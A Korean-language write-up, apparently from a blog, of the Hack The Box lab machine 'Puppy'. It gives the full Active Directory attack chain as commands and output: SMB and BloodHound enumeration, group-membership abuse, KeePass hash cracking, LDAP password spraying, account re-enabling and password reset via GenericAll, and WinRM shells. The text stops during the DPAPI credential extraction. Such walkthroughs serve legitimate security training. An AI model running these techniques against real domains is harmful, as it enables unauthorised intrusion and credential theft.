---
title: "Puppy (Medium)"
date: 2025-11-29
layout: single
excerpt: "Puppy는 Medium 난이도의 머신이며, 기본이 아닌 DEV라는 SMB 공유가 존재한다. 제공된 levi.james 사용자 자격 증명을 통해 도메인 열거가 가능하다. 열거 결과, 이 사용자가 Developers 그룹에 대해 GenericWrite 권한을 가지고 있음이 드러난다. Levi를 해당 그룹에 추가하면, 이전에는 접근할 수 없던 DEV 공유에 접근이 가능해진다. 이 공유에는 KeePass 데이터베이스의 백업이 존재하며, 이를 다운로드한 뒤 해시를 추출해 크랙할 수 있다. 데이터베이스에는 다양한 사용자 이름과 비밀번호 조합이 포함되어 있다. 패스워드 스프레이 공격을 통해 그중 하나의 비밀번호가 사용자 Ant.Edwards에게 유효함이 확인된다. 또한, 이 새로운 사용자는 Adam.Silver 계정에 대해 GenericAll 권한을 가지고 있어 원하는 비밀번호로 변경할 수 있다. 비밀번호 변경 후, 해당 계정이 비활성화되어 있으므로 다시 활성화해야 한다. 이렇게 하면 WinRM을 통해 원격 시스템 접속이 가능해진다. 이후 웹사이트 백업 파일을 발견함으로써 측면 이동이 이뤄지며, 여기에는 사용자 Steph.cooper의 자격 증명이 포함되어 있다. 마지막으로, Steph의 비밀번호를 사용해 복호화한 DPAPI 자격 증명을 통해 권한 상승이 가능하다. 복호화된 자격 증명은 Steph.cooper_adm이며, 이 계정은 관리자 권한이 있어 최종적으로 시스템의 관리자 권한을 얻을 수 있다."
author_profile: true
toc: true
toc_label: "Puppy"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-windows/puppy/puppy.png
  teaser_home_page: true
categories: [hackthebox-windows]
tags: [windows, active-directory, ldap, smb, winrm, password-spray, dpapi, keepass, bloodhound, genericwrite, genericall, priv-esc, evil-winrm, impacket, password-cracking, backup, lateral-movement]

---

![Puppy](/assets/htb-windows/puppy/puppy.png)

Puppy는 **Medium 난이도의 머신**이며, 기본이 아닌 `DEV` 라는 SMB 공유가 존재한다.  
제공된 **`levi.james`** 사용자 자격 증명을 통해 도메인 열거가 가능하다.
열거 결과, 이 사용자가 `Developers` 그룹에 대해 `GenericWrite` 권한을 가지고 있음이 드러난다.

`Levi`를 해당 그룹에 추가하면, 이전에는 접근할 수 없던 `DEV` 공유에 접근이 가능해진다.
이 공유에는 **KeePass 데이터베이스의 백업(`.kdbx`)** 이 존재하며, 이를 다운로드한 뒤 **해시를 추출해 크랙**할 수 있다.  
데이터베이스에는 여러 사용자 계정과 비밀번호 조합이 포함되어 있다.
패스워드 스프레이 공격을 통해 그중 하나의 비밀번호가 사용자 `Ant.Edwards` 에게 유효함이 확인된다.

또한 이 새로운 사용자는 **`Adam.Silver` 계정에 대해 GenericAll 권한**을 가지고 있어  
원하는 비밀번호로 변경할 수 있다.  
비밀번호 변경 후, 해당 계정이 **비활성화 상태**이므로 다시 활성화해야 한다.  
이렇게 하면 WinRM을 통해 원격 시스템 접속이 가능해진다.

이후 웹사이트 백업 파일을 발견하게 되며, 여기에는 사용자 `Steph.cooper` 의 자격 증명이 포함되어 있어  
이를 이용해 **횡적 이동(Lateral Movement)** 이 가능해진다.

마지막으로, Steph의 비밀번호를 사용해 복호화한 `DPAPI` 자격 증명을 통해  
**권한 상승(Privilege Escalation)** 이 이뤄진다.
복호화된 자격 증명은 `Steph.cooper_adm` 이며, 이 계정은 관리자 권한을 가지고 있어, 최종적으로 시스템의 관리자 권한을 얻을 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.232.75`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.232.75 | tee nmap     

Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-28 10:44 EST
Nmap scan report for DC.PUPPY.HTB (10.129.232.75)
Host is up (0.20s latency).
Not shown: 985 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-28 22:44:21Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-11-28T22:46:14
|_  start_date: N/A
|_clock-skew: 7h00m02s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 220.79 seconds
```

Nmap 스캔 결과, `LDAP(389, 3268)`, `Kerberos(88)`, `SMB(445)`, `WinRM(5985)`, `DNS(53)`, `RPC(135)`, `NetBIOS(139)` 등의 서비스가 활성화되어 있다.

LDAP 서비스 정보를 통해 도메인 이름은 `PUPPY.HTB`, 호스트 이름은 `DC` 임을 확인할 수 있다.

## Hosts file configuration

도메인 이름 `PUPPY.HTB` 및 호스트 이름 `DC.PUPPY.HTB` 을 올바르게 해석하기 위해 `/etc/hosts` 파일에 **10.129.245.82 DC.PUPPY.HTB PUPPY.HTB** 를 추가하였다.

```bash
$ cat /etc/hosts | grep PUPPY

10.129.232.75   DC.PUPPY.HTB    PUPPY.HTB
```

---

# Vulnerability Analysis

## SMB Enumeration

> 머신에서 주어진 사용자의 자격 증명은 다음과 같다: (`levi.james` / `KingofAkron2025!`)

SMB 열거를 통해 시스템에 존재하는 SMB 공유를 확인하였다:

```bash
$ nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares

SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share
```

SMB 공유 목록을 확인한 결과, `DEV` 라는 개발자용 공유가 존재한다. 그러나 현재 계정(`levi.james`)은 해당 공유에 접근 권한이 없어 내용을 확인할 수 없다.

## Bloodhound (levi.james User)

위 정보를 활용하여 [bloodhound-ce-python](https://www.kali.org/tools/bloodhound-ce-python/)을 사용하여 **도메인의 Active Directory 구조 및 권한 관계**를 수집하고 ZIP 파일로 저장하였다.

```bash
$ bloodhound-ce-python -c all -d puppy.htb -u levi.james -p 'KingofAkron2025!' -ns 10.129.232.75 --zip

INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB

INFO: Done in 00M 34S
INFO: Compressing output into 20251129025341_bloodhound.zip
```

이후 Bloodhound를 활용하여 분석한 결과, `levi.james` 유저는 `HR` 그룹에 속해 있고, 위 `DEVELOPERS` 그룹에 대해 **GenericWrite 권한**을 가지고 있음을 확인하였다:

![Bloodhound](/assets/htb-windows/puppy/levi-bloodhound.png)

`HR` 그룹이 가진 권한을 활용해 `levi.james` 사용자를 `DEVELOPERS` 그룹의 구성원으로 추가하였다:

```bash
$ net rpc group addmem 'DEVELOPERS' levi.james -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb
```

추가 이후 그룹 구성원 목록을 확인한 결과, 다음과 같이 `levi.james` 계정이 `DEVELOPERS` 그룹에 포함된 것을 확인할 수 있다:

```bash
$ net rpc group members 'DEVELOPERS' -U puppy.htb/levi.james%'KingofAkron2025!' -S puppy.htb

PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```

이후 다시 `levi.james` 계정으로 다시 SMB 공유를 열거한 결과, `DEV` 공유에 대한 읽기 권한이 추가된 것을 확인할 수 있다:

```bash
$ nxc smb puppy.htb -u levi.james -p 'KingofAkron2025!' --shares                                       
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) 
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         10.129.232.75   445    DC               [*] Enumerated shares
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 
```

## Discovery of recovery.kdbx

`DEV` 공유를 살펴본 결과, 해당 디렉터리 내에 `recovery.kdbx` 파일이 존재함을 확인하였다:

```bash
$ smbclient //puppy.htb/DEV -U levi.james --password='KingofAkron2025!'   

Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

                5080575 blocks of size 4096. 1643233 blocks available
```

`recovery.kdbx` 파일을 로컬로 가져온 뒤 확인해보니, 해당 파일은 `KeePass password database 2.x KDBX` 형식으로 식별된다:

```bash
$ file recovery.kdbx 

recovery.kdbx: Keepass password database 2.x KDBX
```

## Hashcrack

이 KDBX 파일의 해시를 확인하기 위해 [keepass2john](https://github.com/openwall/john)을 활용해 크랙에 필요한 해시 값을 추출하였다:

```bash
$ ./keepass2john recovery.kdbx > recovery.hash

$ cat recovery.hash

recovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9
```

추출한 해시 값을 기반으로 KDBX 파일에 대한 크랙을 진행한 결과, 다음과 같이 비밀번호가 확인되었다:

```bash
$ ./john ./recovery.hash --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 37 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 4 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 2 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that's fine)

liverpool        (recovery)     

1g 0:00:00:14 DONE (2025-11-29 04:54) 0.06711g/s 2.416p/s 2.416c/s 2.416C/s jordan..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

해당 KDBX 파일의 비밀번호는 `liverpool` 로 확인되었다.

`recovery.kdbx` 파일을 복호화하여 확인한 결과, 총 **5명의 사용자 계정**이 저장되어 있으며, 각 계정에는 개별 비밀번호가 설정되어 있다:

![user](/assets/htb-windows/puppy/kdbx-user.png)

각 사용자 계정에 저장되어 있던 비밀번호는 다음과 같다:

```text
JAMIE WILLIAMSON     - JamieLove2025!
ADAM SILVER          - HJKL2025!
ANTONY C. EDWARDS    - Antman2025!
STEVE TUCKER         - Steve2025!
SAMUEL BLAKE         - ILY2025!
```

## Password Spraying

`recovery.kdbx`를 통해 확보한 비밀번호들은 다른 계정들에서도 재사용되었을 가능성이 있으므로, 확보한 사용자 비밀번호 목록은 `password.txt` 파일에 정리하여 패스워드 스프레이 공격에 활용할 예정이다.

이후, LDAP를 통해 도메인 내 사용자 계정 목록을 수집하였다:

```bash
$ nxc ldap puppy.htb -u levi.james -p 'KingofAkron2025!' --users

LDAP        10.129.232.75   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.129.232.75   389    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
LDAP        10.129.232.75   389    DC               [*] Enumerated 9 domain users: PUPPY.HTB
LDAP        10.129.232.75   389    DC               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.232.75   389    DC               Administrator                 2025-02-19 14:33:28 0        Built-in account for administering the computer/domain      
LDAP        10.129.232.75   389    DC               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.232.75   389    DC               krbtgt                        2025-02-19 06:46:15 0        Key Distribution Center Service Account                     
LDAP        10.129.232.75   389    DC               levi.james                    2025-02-19 07:10:56 5                                                                    
LDAP        10.129.232.75   389    DC               ant.edwards                   2025-02-19 07:13:14 0                                                                    
LDAP        10.129.232.75   389    DC               adam.silver                   2025-11-29 12:19:29 0                                                                    
LDAP        10.129.232.75   389    DC               jamie.williams                2025-02-19 07:17:26 5                                                                    
LDAP        10.129.232.75   389    DC               steph.cooper                  2025-02-19 07:21:00 5                                                                    
LDAP        10.129.232.75   389    DC               steph.cooper_adm              2025-03-08 10:50:40 5
```

`-Username-` 열에 나타난 사용자 이름들을 `user.txt` 파일로 저장하였다:

```bash
$ nxc ldap puppy.htb -u levi.james -p 'KingofAkron2025!' --users | awk '{print $5}' | grep -Ev '\[[*+]\]|\-Username-' | tee user.txt

Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

`password.txt` 파일과 `user.txt` 파일을 활용하여 LDAP를 통한 패스워드 스프레이 공격을 수행하였다:

```bash
$ nxc ldap puppy.htb -u user.txt -p password.txt                
LDAP        10.129.232.75   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
LDAP        10.129.232.75   389    DC               [-] PUPPY.HTB\Administrator:JamieLove2025! 
LDAP        10.129.232.75   389    DC               [-] PUPPY.HTB\Guest:JamieLove2025! 
LDAP        10.129.232.75   389    DC               [-] PUPPY.HTB\krbtgt:JamieLove2025! 
# [SKIP] 
LDAP        10.129.232.75   389    DC               [-] PUPPY.HTB\Guest:Antman2025! 
LDAP        10.129.232.75   389    DC               [-] PUPPY.HTB\krbtgt:Antman2025! 
LDAP        10.129.232.75   389    DC               [-] PUPPY.HTB\levi.james:Antman2025! 
LDAP        10.129.232.75   389    DC               [+] PUPPY.HTB\ant.edwards:Antman2025!
```

해당 결과를 통해 `ant.edwards` 사용자 계정의 비밀번호가 `Antman2025!` 임을 확인하였다.

## Bloodhound (ant.edwards User)

`ant.edwards` 사용자는 `SENIOR DEVS` 그룹에 속해 있으며, `adam.silver` 사용자의 대한 `GenericAll` 권한을 보유하고 있다.

![권한 확인](/assets/htb-windows/puppy/ant-user-bloodhound.png)

그리고 `adam.silver` 사용자는 현재 비활성화(`Disabled`) 상태이다.

![비활성화 상태](/assets/htb-windows/puppy/adam-enabled.png)

---

# Exploitation

## Remote Shell via WinRM

`GenericAll` 권한을 활용하여 [bloodyAD](https://www.kali.org/tools/bloodyad/)를 이용해 `adam.silver` 사용자의 비활성화 상태를 해제하였다:

```bash
$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

LDAP 쿼리를 통해 `adam.silver` 사용자의 `userAccountControl` 값을 확인한 결과, **계정이 [활성화](https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/) 상태(66048)**임을 확인하였다:

```bash
$ ldapsearch -x -D "ant.edwards@puppy.htb" -w 'Antman2025!' -H ldap://dc.puppy.htb -b "CN=Users,DC=puppy,DC=htb" "sAMAccountName=adam.silver" userAccountControl

# extended LDIF
#
# LDAPv3
# base <CN=Users,DC=puppy,DC=htb> with scope subtree
# filter: sAMAccountName=adam.silver
# requesting: userAccountControl 
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
userAccountControl: 66048

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

이후, `adam.silver` 계정의 비밀번호를 `Asdf1234@` 로 변경하였다:

```bash
$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' set password adam.silver 'Asdf1234@'

[+] Password changed successfully!
```

변경한 비밀번호를 이용하여 해당 계정(`adam.silver`)을 통해 WinRM 접속 가능 여부를 확인하였다:

```bash
$ nxc winrm puppy.htb -u adam.silver -p 'Asdf1234@'                                                                 
WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)

WINRM       10.129.232.75   5985   DC               [+] PUPPY.HTB\adam.silver:Asdf1234@ (Pwn3d!)
```

해당 결과를 통해, **WinRM 포트를 통한 원격 접속**이 가능함을 확인할 수 있다.

`Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속을 시도하였으며, 성공적으로 **adam.silver 사용자의 PowerShell 세션을 획득**하였다:

![세션 획득](/assets/htb-windows/puppy/adam-shell.png)

---

# Privilege Escalation

## Lateral Movement: adam.silver → steph.cooper

### Discovery of Backup file

C 드라이브의 루트 경로에서 `Backups` 라는 디렉토리가 발견되었다.

```text
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         7/24/2025  12:30 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---          3/8/2025   8:52 AM                Users
d-----         5/13/2025   4:40 PM                Windows
```

`Backups` 디렉토리의 내부를 확인한 결과, 하나의 `.zip` 형식 백업 파일이 존재함을 확인하였다:

```text
PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip
```

위 `.zip` 파일을 로컬로 다운로드 받은 후 압축을 해제한 결과, 다음과 같은 디렉토리 및 파일들이 포함되어 있었다:

```bash
$ unzip site-backup-2024-12-30.zip
Archive:  site-backup-2024-12-30.zip
   creating: puppy/
  inflating: puppy/nms-auth-config.xml.bak  
   creating: puppy/images/
  inflating: puppy/images/banner.jpg  

  # [SKIP]  

  inflating: puppy/assets/sass/libs/_mixins.scss  
  inflating: puppy/index.html  
```

`nms-auth-config.xml.bak` 백업 파일을 분석한 결과, `steph.cooper` 사용자의 비밀번호(`ChefSteph2025!`)가 노출되어 있었다:

```html
$ cat nms-auth-config.xml.bak 

<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

### Remote Shell via WinRM (steph.cooper)

백업 파일 정보를 바탕으로 로컬 터미널로 돌아와 해당 계정(`steph.cooper`)을 이용하여 WinRM 접속 가능 여부를 확인하였다:

```bash
$ nxc winrm puppy.htb -u steph.cooper -p 'ChefSteph2025!'
WINRM       10.129.232.75   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)

WINRM       10.129.232.75   5985   DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! (Pwn3d!)
```

이후, `Evil-WinRM` 을 통해 대상 시스템에 원격으로 접속을 시도하였으며, 성공적으로 **steph.cooper 사용자의 PowerShell 세션을 획득**하였다:

![세션 획득](/assets/htb-windows/puppy/steph-shell.png)

## Lateral Movement: steph.cooper → steph.cooper_adm

### Enumeration with winPEAS

권한 상승 가능성을 탐색하기 위해 [winPEAS](https://github.com/peass-ng/PEASS-ng) 도구를 업로드하여 실행하였다:

```text
PS C:\Users\steph.cooper> upload winPEASx64.exe
                                        
Info: Uploading /home/kali/htb/puppy/winPEASx64.exe to C:\Users\steph.cooper\winPEASx64.exe
                                        
Data: 13561172 bytes of 13561172 bytes copied
                                        
Info: Upload successful!

PS C:\Users\steph.cooper> ./winPEASx64.exe
```

winPEAS 실행 결과, **DPAPI 관련 마스터 키 및 자격 증명 파일** 이 존재하는 것을 확인하였다:

```text
ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:40:36 AM
    Modified: 3/8/2025 7:40:36 AM
   =================================================================================================


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================================

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
   =================================================================================================
```

### DPAPI Credential Extraction

winPEAS를 통해 확인된 **MasterKey(`556a2412-1275-4ccf-b721-e6a0b4f90407`)**에 해당하는 실제 파일이 존재하는지 확인하였다.

해당 파일은 사용자 DPAPI 경로 내 숨김 파일로 존재하고 있었다:

```text
PS C:\Users\steph.cooper> ls C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107 -force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

해당 `MasterKey` 파일은 숨김이 적용되어 있어 일반적인 `download` 명령어로는 파일 추출이 불가능하였다.

따라서 **Base64 인코딩**을 활용하여 로컬로 복사하였다:

```text
PS C:\Users\steph.cooper> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"))

AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOAr[SKIP]
gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=
```

출력된 Base64 문자열을 로컬 시스템에 복사한 뒤, 디코딩 후 `masterkey` 파일로 저장하였다:

```bash
$ printf "AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOA
[SKIP]
gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=" | base64 -d > masterkey
```

두 개의 Credential 파일 역시 숨김 파일이었기 때문에, 동일한 방식으로 **Base64 인코딩 후 복사**하였다. 각각 `local.credentials` 와 `enterprise.credentials` 로 저장하였다.

`DFBE70A7E5CC19A398EBF1B96859CE5D` (**Local Credential Data**):

```text
PS C:\Users\steph.cooper> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"))

AQAAADArAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl
[SKIP]
+7lhrGCOooknPOCjMEMHRzxQAAACBslHrPU2GsYKqWpGrnz5k9xUiGw==
```

```bash
$ printf "AQAAADArAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl
[SKIP]
+7lhrGCOooknPOCjMEMHRzxQAAACBslHrPU2GsYKqWpGrnz5k9xUiGw==" | base64 -d > local.credentials
```

`C8D69EBE9A43E9DEBF6B5FBD48B521B9` (**Enterprise Credential Data**):

```
PS C:\Users\steph.cooper> [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9"))

AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAI
[SKIP]
+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc
```

```bash
